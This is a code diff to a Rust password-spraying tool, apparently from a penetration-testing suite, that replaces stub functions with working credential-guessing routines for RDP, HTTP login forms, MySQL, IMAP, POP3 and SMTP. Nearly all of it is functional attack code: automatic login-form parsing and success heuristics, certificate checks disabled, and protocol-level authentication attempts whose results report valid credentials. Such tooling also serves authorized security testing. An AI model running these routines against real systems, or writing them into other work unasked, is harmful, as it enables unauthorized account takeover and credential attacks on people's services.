@@ -722,8 +722,123 @@ impl PasswordSprayer {
     }
 
     async fn try_rdp(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
-        // RDP authentication is complex - placeholder
-        (false, Some("RDP spray not implemented".to_string()))
+        use tokio::process::Command;
+
+        // Parse host and port
+        let (host, port) = if target.contains(':') {
+            let parts: Vec<&str> = target.split(':').collect();
+            (parts[0].to_string(), parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(3389))
+        } else {
+            (target.to_string(), 3389)
+        };
+
+        // Check if xfreerdp is available (it's the most reliable RDP client for auth-only)
+        let freerdp_check = Command::new("which")
+            .arg("xfreerdp")
+            .output()
+            .await;
+
+        let use_freerdp = freerdp_check.map(|o| o.status.success()).unwrap_or(false);
+
+        if use_freerdp {
+            // Use xfreerdp for RDP authentication test
+            let result = Command::new("xfreerdp")
+                .args([
+                    &format!("/v:{}:{}", host, port),
+                    &format!("/u:{}", username),
+                    &format!("/p:{}", password),
+                    "/auth-only",        // Don't connect, just authenticate
+                    "/sec:nla",          // Network Level Authentication
+                    "/cert:ignore",      // Ignore certificate errors
+                    "/log-level:ERROR",  // Reduce log noise
+                ])
+                .output()
+                .await;
+
+            match result {
+                Ok(output) => {
+                    let stderr = String::from_utf8_lossy(&output.stderr).to_lowercase();
+                    let stdout = String::from_utf8_lossy(&output.stdout).to_lowercase();
+
+                    // Check for successful authentication
+                    if output.status.success()
+                        || stderr.contains("authentication only")
+                        || stdout.contains("authentication only")
+                    {
+                        return (true, Some("RDP (NLA) authentication successful".to_string()));
+                    }
+
+                    // Check for specific error messages
+                    if stderr.contains("logon_failure") || stderr.contains("logon failure") {
+                        return (false, Some("RDP authentication failed - invalid credentials".to_string()));
+                    }
+                    if stderr.contains("account_disabled") {
+                        return (false, Some("RDP authentication failed - account disabled".to_string()));
+                    }
+                    if stderr.contains("password_expired") {
+                        return (false, Some("RDP authentication - password expired (valid creds)".to_string()));
+                    }
+                    if stderr.contains("connect") || stderr.contains("refused") {
+                        return (false, Some(format!("RDP connection failed to {}:{}", host, port)));
+                    }
+
+                    (false, Some(format!("RDP auth unclear: {}", stderr.chars().take(100).collect::<String>())))
+                }
+                Err(e) => (false, Some(format!("Failed to execute xfreerdp: {}", e))),
+            }
+        } else {
+            // Fallback: TCP connection test and basic RDP negotiation
+            use tokio::net::TcpStream;
+            use tokio::io::{AsyncReadExt, AsyncWriteExt};
+
+            let addr = format!("{}:{}", host, port);
+
+            match tokio::time::timeout(
+                std::time::Duration::from_secs(self.config.timeout_secs),
+                TcpStream::connect(&addr)
+            ).await {
+                Ok(Ok(mut stream)) => {
+                    // Send RDP negotiation request (X.224 Connection Request)
+                    let x224_request = [
+                        0x03, 0x00, 0x00, 0x2c, // TPKT: version, reserved, length
+                        0x27, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, // X.224 CR
+                        // Cookie
+                        0x43, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 0x3a, 0x20, // "Cookie: "
+                        0x6d, 0x73, 0x74, 0x73, 0x68, 0x61, 0x73, 0x68, // "mstshash"
+                        0x3d, 0x00, 0x0d, 0x0a, // "=\r\n"
+                        // RDP Negotiation Request
+                        0x01, 0x00, 0x08, 0x00, // TYPE_RDP_NEG_REQ
+                        0x03, 0x00, 0x00, 0x00, // requestedProtocols = PROTOCOL_SSL | PROTOCOL_HYBRID
+                    ];
+
+                    if stream.write_all(&x224_request).await.is_err() {
+                        return (false, Some("Failed to send RDP negotiation".to_string()));
+                    }
+
+                    let mut response = vec![0u8; 256];
+                    match tokio::time::timeout(
+                        std::time::Duration::from_secs(5),
+                        stream.read(&mut response)
+                    ).await {
+                        Ok(Ok(n)) if n > 0 => {
+                            // Basic check: got a response
+                            if response[0] == 0x03 {
+                                // Valid TPKT response - RDP service is running
+                                // Without xfreerdp, we can't do full auth
+                                (false, Some("RDP service active (install xfreerdp for full auth test)".to_string()))
+                            } else {
+                                (false, Some("Unexpected RDP response".to_string()))
+                            }
+                        }
+                        Ok(Ok(_)) => (false, Some("Empty RDP response".to_string())),
+                        Ok(Err(e)) => (false, Some(format!("RDP read error: {}", e))),
+                        Err(_) => (false, Some("RDP response timeout".to_string())),
+                    }
+                }
+                Ok(Err(e)) => (false, Some(format!("RDP connection failed: {}", e))),
+                Err(_) => (false, Some("RDP connection timeout".to_string())),
+            }
+        }
     }
 
     async fn try_winrm(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
@@ -794,9 +909,164 @@ impl PasswordSprayer {
         }
     }
 
-    async fn try_http_form(&self, _target: &str, _username: &str, _password: &str) -> (bool, Option<String>) {
-        // HTTP form auth requires knowing the form structure
-        (false, Some("HTTP form spray not implemented".to_string()))
+    async fn try_http_form(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
+        use scraper::{Html, Selector};
+        use std::collections::HashMap;
+
+        // Create HTTP client for form submission
+        // Note: For proper session handling, a cookie jar should be used
+        let client = reqwest::Client::builder()
+            .timeout(std::time::Duration::from_secs(self.config.timeout_secs))
+            .danger_accept_invalid_certs(true)
+            .redirect(reqwest::redirect::Policy::limited(5))
+            .build();
+
+        let client = match client {
+            Ok(c) => c,
+            Err(e) => return (false, Some(format!("Failed to create HTTP client: {}", e))),
+        };
+
+        // 1. Fetch the login page
+        let page_resp = match client.get(target).send().await {
+            Ok(resp) => resp,
+            Err(e) => return (false, Some(format!("Failed to fetch login page: {}", e))),
+        };
+
+        let page_url = page_resp.url().clone();
+        let page_html = match page_resp.text().await {
+            Ok(html) => html,
+            Err(e) => return (false, Some(format!("Failed to read page: {}", e))),
+        };
+
+        // 2. Parse HTML and find login form
+        let document = Html::parse_document(&page_html);
+        let form_selector = Selector::parse("form").unwrap();
+        let input_selector = Selector::parse("input").unwrap();
+
+        // Find the login form (look for forms with password fields)
+        let mut login_form = None;
+        for form in document.select(&form_selector) {
+            let has_password = form.select(&input_selector)
+                .any(|input| input.value().attr("type").map(|t| t == "password").unwrap_or(false));
+            if has_password {
+                login_form = Some(form);
+                break;
+            }
+        }
+
+        let form = match login_form {
+            Some(f) => f,
+            None => return (false, Some("No login form found on page".to_string())),
+        };
+
+        // 3. Get form action URL
+        let action = form.value().attr("action").unwrap_or("");
+        let form_action = if action.is_empty() || action == "#" {
+            page_url.as_str().to_string()
+        } else if action.starts_with("http") {
+            action.to_string()
+        } else if action.starts_with('/') {
+            format!("{}://{}{}", page_url.scheme(), page_url.host_str().unwrap_or(""), action)
+        } else {
+            format!("{}/{}", page_url.as_str().trim_end_matches('/'), action)
+        };
+
+        let method = form.value().attr("method").unwrap_or("post").to_lowercase();
+
+        // 4. Build form data
+        let mut form_data: HashMap<String, String> = HashMap::new();
+
+        for input in form.select(&input_selector) {
+            let name = match input.value().attr("name") {
+                Some(n) if !n.is_empty() => n.to_string(),
+                _ => continue,
+            };
+
+            let input_type = input.value().attr("type").unwrap_or("text").to_lowercase();
+            let name_lower = name.to_lowercase();
+
+            // Identify and fill username field
+            if input_type == "text" || input_type == "email" {
+                if name_lower.contains("user") || name_lower.contains("login")
+                    || name_lower.contains("email") || name_lower.contains("name")
+                    || name_lower.contains("account") || name_lower == "id"
+                {
+                    form_data.insert(name, username.to_string());
+                    continue;
+                }
+            }
+
+            // Identify and fill password field
+            if input_type == "password" {
+                form_data.insert(name, password.to_string());
+                continue;
+            }
+
+            // Include hidden fields and other inputs with default values
+            if let Some(value) = input.value().attr("value") {
+                form_data.insert(name, value.to_string());
+            }
+        }
+
+        // Verify we found username and password fields
+        let has_username = form_data.values().any(|v| v == username);
+        let has_password = form_data.values().any(|v| v == password);
+
+        if !has_username || !has_password {
+            return (false, Some("Could not identify username/password fields in form".to_string()));
+        }
+
+        // 5. Submit the form
+        let submit_result = if method == "get" {
+            client.get(&form_action).query(&form_data).send().await
+        } else {
+            client.post(&form_action).form(&form_data).send().await
+        };
+
+        let resp = match submit_result {
+            Ok(r) => r,
+            Err(e) => return (false, Some(format!("Form submission failed: {}", e))),
+        };
+
+        // 6. Analyze response for success/failure
+        let final_url = resp.url().clone();
+        let status = resp.status();
+        let resp_html = resp.text().await.unwrap_or_default().to_lowercase();
+
+        // Check for common login failure indicators
+        let failure_indicators = [
+            "invalid", "incorrect", "wrong", "failed", "error", "denied",
+            "invalid credentials", "login failed", "authentication failed",
+            "bad password", "unknown user", "does not exist", "try again",
+        ];
+
+        let has_failure_indicator = failure_indicators.iter()
+            .any(|ind| resp_html.contains(ind));
+
+        // Check for common success indicators
+        let success_indicators = [
+            "dashboard", "welcome", "logged in", "successfully", "my account",
+            "profile", "logout", "sign out", "home",
+        ];
+
+        let has_success_indicator = success_indicators.iter()
+            .any(|ind| resp_html.contains(ind));
+
+        // Also check URL changes (redirect away from login page often indicates success)
+        let url_changed = final_url.as_str() != target && !final_url.as_str().contains("login");
+
+        // Determine success
+        if status.is_success() && (has_success_indicator || url_changed) && !has_failure_indicator {
+            (true, Some(format!("HTTP form login successful (redirected to {})", final_url)))
+        } else if status.as_u16() == 401 || status.as_u16() == 403 {
+            (false, Some("HTTP form authentication rejected".to_string()))
+        } else if has_failure_indicator {
+            (false, Some("Login failed - error message detected in response".to_string()))
+        } else if status.is_redirection() {
+            (false, Some(format!("Redirect to {} (login may have failed)", final_url)))
+        } else {
+            (false, Some(format!("Login status unclear (HTTP {})", status)))
+        }
     }
 
     async fn try_mssql(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
@@ -856,53 +1126,55 @@ impl PasswordSprayer {
     }
 
     async fn try_mysql(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
-        // Native MySQL protocol implementation
-        use tokio::net::TcpStream;
-        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        use mysql_async::{Pool, Opts, OptsBuilder};
 
-        let addr = if target.contains(':') {
-            target.to_string()
+        // Parse host and port
+        let (host, port) = if target.contains(':') {
+            let parts: Vec<&str> = target.split(':').collect();
+            (parts[0].to_string(), parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(3306))
         } else {
-            format!("{}:3306", target)
+            (target.to_string(), 3306)
         };
 
-        let connect_result = tokio::time::timeout(
-            std::time::Duration::from_secs(self.config.timeout_secs),
-            TcpStream::connect(&addr)
-        ).await;
+        // Build MySQL connection options
+        // Note: Connection timeout is handled by tokio::time::timeout below
+        let opts = OptsBuilder::default()
+            .ip_or_hostname(&host)
+            .tcp_port(port)
+            .user(Some(username))
+            .pass(Some(password))
+            .db_name(Some("information_schema")); // Connect to information_schema which always exists
 
-        match connect_result {
-            Ok(Ok(mut stream)) => {
-                // Read initial handshake packet
-                let mut header = [0u8; 4];
-                if stream.read_exact(&mut header).await.is_err() {
-                    return (false, Some("Failed to read MySQL handshake".to_string()));
-                }
+        let pool = Pool::new(Opts::from(opts));
 
-                let payload_len = header[0] as usize | ((header[1] as usize) << 8) | ((header[2] as usize) << 16);
-                let mut payload = vec![0u8; payload_len];
-                if stream.read_exact(&mut payload).await.is_err() {
-                    return (false, Some("Failed to read handshake payload".to_string()));
-                }
+        // Try to get a connection - this will authenticate
+        match tokio::time::timeout(
+            std::time::Duration::from_secs(self.config.timeout_secs + 5), // Add buffer for connection setup
+            pool.get_conn()
+        ).await {
+            Ok(Ok(conn)) => {
+                // Successfully authenticated
+                drop(conn);
+                let _ = pool.disconnect().await;
+                (true, Some("MySQL authentication successful".to_string()))
+            }
+            Ok(Err(e)) => {
+                let err_str = e.to_string();
+                let _ = pool.disconnect().await;
 
-                // Check protocol version (first byte should be 10 for MySQL 5.x+)
-                if payload.is_empty() || payload[0] < 9 {
-                    return (false, Some("Unsupported MySQL protocol".to_string()));
-                }
-
-                // Find the auth data (scramble) - complex to parse fully
-                // For now, check if we got a valid handshake
-                if payload.len() > 5 {
-                    // Basic connection established, server responded
-                    // Full auth would require MYSQL native password or sha256
-                    // Just report success if we reached this point
-                    (false, Some("MySQL handshake received (full auth not implemented)".to_string()))
+                // Check for specific auth failure messages
+                if err_str.contains("Access denied") {
+                    (false, Some(format!("MySQL access denied for user '{}'", username)))
+                } else if err_str.contains("authentication") || err_str.contains("password") {
+                    (false, Some("MySQL authentication failed".to_string()))
                 } else {
-                    (false, Some("Invalid MySQL handshake".to_string()))
+                    (false, Some(format!("MySQL error: {}", err_str)))
                 }
             }
-            Ok(Err(e)) => (false, Some(format!("MySQL connection failed: {}", e))),
-            Err(_) => (false, Some("MySQL connection timeout".to_string())),
+            Err(_) => {
+                let _ = pool.disconnect().await;
+                (false, Some("MySQL connection timeout".to_string()))
+            }
         }
     }
 
@@ -1066,19 +1338,298 @@ impl PasswordSprayer {
         }
     }
 
+    /// IMAP authentication (ports 143/993)
     async fn try_imap(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
-        // IMAP login
-        (false, Some("IMAP spray not fully implemented".to_string()))
+        use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
+
+        let addr = if target.contains(':') {
+            target.to_string()
+        } else {
+            format!("{}:143", target) // Default IMAP port
+        };
+
+        let timeout_duration = std::time::Duration::from_secs(self.config.timeout_secs);
+
+        match tokio::time::timeout(
+            timeout_duration,
+            tokio::net::TcpStream::connect(&addr)
+        ).await {
+            Ok(Ok(stream)) => {
+                let (reader, mut writer) = stream.into_split();
+                let mut reader = BufReader::new(reader);
+                let mut line = String::new();
+
+                // Read server banner
+                if reader.read_line(&mut line).await.is_err() {
+                    return (false, Some("Failed to read IMAP banner".to_string()));
+                }
+
+                // Check for OK banner (IMAP servers respond with * OK ...)
+                if !line.starts_with("* OK") && !line.starts_with("*OK") {
+                    return (false, Some(format!("Unexpected IMAP banner: {}", line.trim())));
+                }
+
+                // Send LOGIN command
+                // IMAP LOGIN format: A001 LOGIN username password
+                let login_cmd = format!("A001 LOGIN \"{}\" \"{}\"\r\n",
+                    username.replace('\\', "\\\\").replace('"', "\\\""),
+                    password.replace('\\', "\\\\").replace('"', "\\\""));
+
+                if writer.write_all(login_cmd.as_bytes()).await.is_err() {
+                    return (false, Some("Failed to send IMAP LOGIN".to_string()));
+                }
+
+                // Read response (may be multiple lines, look for tagged response)
+                loop {
+                    line.clear();
+                    match tokio::time::timeout(
+                        std::time::Duration::from_secs(10),
+                        reader.read_line(&mut line)
+                    ).await {
+                        Ok(Ok(0)) => {
+                            return (false, Some("Connection closed".to_string()));
+                        }
+                        Ok(Ok(_)) => {
+                            // Look for tagged response (A001 OK or A001 NO or A001 BAD)
+                            if line.starts_with("A001 OK") {
+                                // Login successful - send LOGOUT
+                                let _ = writer.write_all(b"A002 LOGOUT\r\n").await;
+                                return (true, Some("IMAP authentication successful".to_string()));
+                            } else if line.starts_with("A001 NO") || line.starts_with("A001 BAD") {
+                                return (false, Some(format!("IMAP auth failed: {}", line.trim())));
+                            }
+                            // Continue reading if untagged response (* ...)
+                        }
+                        Ok(Err(e)) => {
+                            return (false, Some(format!("Read error: {}", e)));
+                        }
+                        Err(_) => {
+                            return (false, Some("Response timeout".to_string()));
+                        }
+                    }
+                }
+            }
+            Ok(Err(e)) => (false, Some(format!("Connection failed: {}", e))),
+            Err(_) => (false, Some("Connection timeout".to_string())),
+        }
     }
 
+    /// POP3 authentication (ports 110/995)
     async fn try_pop3(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
-        // POP3 login
-        (false, Some("POP3 spray not fully implemented".to_string()))
+        use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
+
+        let addr = if target.contains(':') {
+            target.to_string()
+        } else {
+            format!("{}:110", target) // Default POP3 port
+        };
+
+        let timeout_duration = std::time::Duration::from_secs(self.config.timeout_secs);
+
+        match tokio::time::timeout(
+            timeout_duration,
+            tokio::net::TcpStream::connect(&addr)
+        ).await {
+            Ok(Ok(stream)) => {
+                let (reader, mut writer) = stream.into_split();
+                let mut reader = BufReader::new(reader);
+                let mut line = String::new();
+
+                // Read server banner
+                if reader.read_line(&mut line).await.is_err() {
+                    return (false, Some("Failed to read POP3 banner".to_string()));
+                }
+
+                // Check for +OK banner
+                if !line.starts_with("+OK") {
+                    return (false, Some(format!("Unexpected POP3 banner: {}", line.trim())));
+                }
+
+                // Send USER command
+                let user_cmd = format!("USER {}\r\n", username);
+                if writer.write_all(user_cmd.as_bytes()).await.is_err() {
+                    return (false, Some("Failed to send USER".to_string()));
+                }
+
+                // Read USER response
+                line.clear();
+                match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                    Ok(Ok(_)) => {
+                        if !line.starts_with("+OK") {
+                            return (false, Some(format!("USER rejected: {}", line.trim())));
+                        }
+                    }
+                    _ => return (false, Some("USER response timeout".to_string())),
+                }
+
+                // Send PASS command
+                let pass_cmd = format!("PASS {}\r\n", password);
+                if writer.write_all(pass_cmd.as_bytes()).await.is_err() {
+                    return (false, Some("Failed to send PASS".to_string()));
+                }
+
+                // Read PASS response
+                line.clear();
+                match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                    Ok(Ok(_)) => {
+                        if line.starts_with("+OK") {
+                            // Auth successful - send QUIT
+                            let _ = writer.write_all(b"QUIT\r\n").await;
+                            (true, Some("POP3 authentication successful".to_string()))
+                        } else if line.starts_with("-ERR") {
+                            (false, Some(format!("POP3 auth failed: {}", line.trim())))
+                        } else {
+                            (false, Some(format!("Unexpected POP3 response: {}", line.trim())))
+                        }
+                    }
+                    Ok(Err(e)) => (false, Some(format!("Read error: {}", e))),
+                    Err(_) => (false, Some("PASS response timeout".to_string())),
+                }
+            }
+            Ok(Err(e)) => (false, Some(format!("Connection failed: {}", e))),
+            Err(_) => (false, Some("Connection timeout".to_string())),
+        }
     }
 
+    /// SMTP authentication (ports 25/587/465)
     async fn try_smtp(&self, target: &str, username: &str, password: &str) -> (bool, Option<String>) {
-        // SMTP auth
-        (false, Some("SMTP spray not fully implemented".to_string()))
+        use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
+        use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
+
+        let addr = if target.contains(':') {
+            target.to_string()
+        } else {
+            format!("{}:587", target) // Default submission port
+        };
+
+        let timeout_duration = std::time::Duration::from_secs(self.config.timeout_secs);
+
+        match tokio::time::timeout(
+            timeout_duration,
+            tokio::net::TcpStream::connect(&addr)
+        ).await {
+            Ok(Ok(stream)) => {
+                let (reader, mut writer) = stream.into_split();
+                let mut reader = BufReader::new(reader);
+                let mut line = String::new();
+
+                // Read server banner (220 ...)
+                if reader.read_line(&mut line).await.is_err() {
+                    return (false, Some("Failed to read SMTP banner".to_string()));
+                }
+
+                if !line.starts_with("220") {
+                    return (false, Some(format!("Unexpected SMTP banner: {}", line.trim())));
+                }
+
+                // Send EHLO
+                let ehlo_cmd = format!("EHLO heroforge.local\r\n");
+                if writer.write_all(ehlo_cmd.as_bytes()).await.is_err() {
+                    return (false, Some("Failed to send EHLO".to_string()));
+                }
+
+                // Read EHLO response (may be multiline, ends with 250 space)
+                let mut supports_auth = false;
+                let mut auth_methods = Vec::new();
+                loop {
+                    line.clear();
+                    match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                        Ok(Ok(_)) => {
+                            if line.contains("AUTH") {
+                                supports_auth = true;
+                                // Parse auth methods (e.g., "250-AUTH LOGIN PLAIN")
+                                if let Some(methods) = line.split("AUTH").nth(1) {
+                                    auth_methods.extend(methods.split_whitespace().map(|s| s.to_uppercase()));
+                                }
+                            }
+                            // Check if this is the last response line (250 space, not 250-)
+                            if line.starts_with("250 ") {
+                                break;
+                            }
+                            // Continue if multiline (250-)
+                            if !line.starts_with("250") {
+                                return (false, Some(format!("EHLO failed: {}", line.trim())));
+                            }
+                        }
+                        Ok(Err(e)) => return (false, Some(format!("Read error: {}", e))),
+                        Err(_) => return (false, Some("EHLO response timeout".to_string())),
+                    }
+                }
+
+                if !supports_auth {
+                    return (false, Some("Server does not support AUTH".to_string()));
+                }
+
+                // Try AUTH LOGIN (most common) or AUTH PLAIN
+                let auth_success = if auth_methods.contains(&"LOGIN".to_string()) {
+                    // AUTH LOGIN flow
+                    if writer.write_all(b"AUTH LOGIN\r\n").await.is_err() {
+                        return (false, Some("Failed to send AUTH LOGIN".to_string()));
+                    }
+
+                    // Read 334 Username prompt
+                    line.clear();
+                    match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                        Ok(Ok(_)) if line.starts_with("334") => {}
+                        _ => return (false, Some("AUTH LOGIN rejected".to_string())),
+                    }
+
+                    // Send base64-encoded username
+                    let username_b64 = BASE64.encode(username.as_bytes());
+                    if writer.write_all(format!("{}\r\n", username_b64).as_bytes()).await.is_err() {
+                        return (false, Some("Failed to send username".to_string()));
+                    }
+
+                    // Read 334 Password prompt
+                    line.clear();
+                    match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                        Ok(Ok(_)) if line.starts_with("334") => {}
+                        _ => return (false, Some("Username rejected".to_string())),
+                    }
+
+                    // Send base64-encoded password
+                    let password_b64 = BASE64.encode(password.as_bytes());
+                    if writer.write_all(format!("{}\r\n", password_b64).as_bytes()).await.is_err() {
+                        return (false, Some("Failed to send password".to_string()));
+                    }
+
+                    // Read final response
+                    line.clear();
+                    match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                        Ok(Ok(_)) => line.starts_with("235"),
+                        _ => false,
+                    }
+                } else if auth_methods.contains(&"PLAIN".to_string()) {
+                    // AUTH PLAIN: base64(\0username\0password)
+                    let auth_string = format!("\x00{}\x00{}", username, password);
+                    let auth_b64 = BASE64.encode(auth_string.as_bytes());
+                    let auth_cmd = format!("AUTH PLAIN {}\r\n", auth_b64);
+
+                    if writer.write_all(auth_cmd.as_bytes()).await.is_err() {
+                        return (false, Some("Failed to send AUTH PLAIN".to_string()));
+                    }
+
+                    line.clear();
+                    match tokio::time::timeout(std::time::Duration::from_secs(10), reader.read_line(&mut line)).await {
+                        Ok(Ok(_)) => line.starts_with("235"),
+                        _ => false,
+                    }
+                } else {
+                    return (false, Some(format!("Unsupported auth methods: {:?}", auth_methods)));
+                };
+
+                // Send QUIT
+                let _ = writer.write_all(b"QUIT\r\n").await;
+
+                if auth_success {
+                    (true, Some("SMTP authentication successful".to_string()))
+                } else {
+                    (false, Some(format!("SMTP auth failed: {}", line.trim())))
+                }
+            }
+            Ok(Err(e)) => (false, Some(format!("Connection failed: {}", e))),
+            Err(_) => (false, Some("Connection timeout".to_string())),
+        }
     }
 
     fn calculate_delay(&self, base_secs: u64) -> u64 {
